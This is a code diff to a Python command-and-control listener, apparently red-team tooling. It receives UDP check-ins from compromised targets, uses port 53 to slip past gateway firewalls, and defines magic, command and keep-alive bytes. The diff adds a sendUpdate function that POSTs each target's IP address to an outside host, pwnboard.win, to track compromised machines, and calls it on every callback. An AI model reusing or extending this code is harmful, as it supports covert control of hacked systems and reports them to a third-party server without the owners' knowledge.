@@ -21,8 +21,19 @@ RESPONSE_BYTE = b'\x03'
 KEEP_ALIVE_BYTE = b'\x04'
 RAW_COMMAND = MAGIC_BYTES + b'\x02\x01'
 
-SERVER_ADDRESS = ('192.168.214.153', 1337)
+SERVER_ADDRESS = ('', 1337)
 TARGET_PORT = 53 # Only used to get past gateway firewalls
+
+def sendUpdate(ip, name="BP"):
+    host = "http://pwnboard.win/generic"
+    data = {'ip': ip, 'type': name}
+    try:
+        req = requests.post(host, json=data, timeout=3)
+        print(req.text)
+        return True
+    except Exception as E:
+        print(E)
+        return False
 
 def socket_listen(targets, pipe, stagePercent, targetsWithCommandsStill):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -50,6 +61,7 @@ def socket_listen(targets, pipe, stagePercent, targetsWithCommandsStill):
         except:
             continue
         cur_target = addr[0]
+        sendUpdate(cur_target)
         target_address = bytes(map(int, cur_target.split('.')))
         cmd_num = data[6:10]
         if pipe.poll():
